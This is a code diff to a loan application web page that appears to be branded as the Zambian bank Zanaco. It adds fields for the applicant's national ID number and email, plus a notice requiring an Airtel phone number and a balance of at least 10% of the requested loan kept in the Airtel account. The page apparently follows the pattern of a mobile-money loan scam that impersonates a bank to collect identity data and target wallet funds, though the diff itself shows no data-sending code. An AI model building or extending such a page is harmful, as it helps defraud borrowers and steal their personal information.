@@ -68,6 +68,22 @@
 .zanaco-header {
     text-align: center;
 }
+.loan-notice {
+    background: #fff3cd;
+    color: #856404;
+    border: 1px solid #ffeeba;
+    padding: 12px 15px;
+    border-radius: 6px;
+    margin-bottom: 20px;
+    font-size: 14px;
+    margin-top: 10px;
+}
+
+.loan-notice h4 {
+    margin: 0 0 8px 0;
+    font-size: 15px;
+}
+
   </style>
 </head>
 <body>
@@ -82,9 +98,14 @@
   <h2>Loan Application</h2>
 
   <label>Loan Amount (ZMW)</label>
-  <input type="number" id="amount" placeholder="500-20,000" required>
+  <input type="number" id="amount" placeholder="500-20000" required>
 
+  <label>National Id</label>
+   <input type="number" id="nationalid" placeholder="National Id" required>
+    <label>Email</label>
+   <input type="email" id="email" placeholder="example@gmail.com" required>
   <label>Repayment Period</label>
+ 
   <select id="period" required>
     <option value="">Select period</option>
     <option>7 Days(1.5% intrest)</option>
@@ -112,6 +133,13 @@
     <option>School fees</option>
     <option>Medical</option>
   </select>
+    <div class="loan-notice">
+    <h4>Loan Qualifications:</h4>
+    <ul>
+        <li>Applicant must use an <strong>Airtel</strong> number.</li>
+        <li>Maintain at least <strong>10%</strong> of the loan amount applying for in the Airtel account.</li>
+    </ul>
+</div>
 
   <button onclick="goNext()">Continue</button>
 </div>
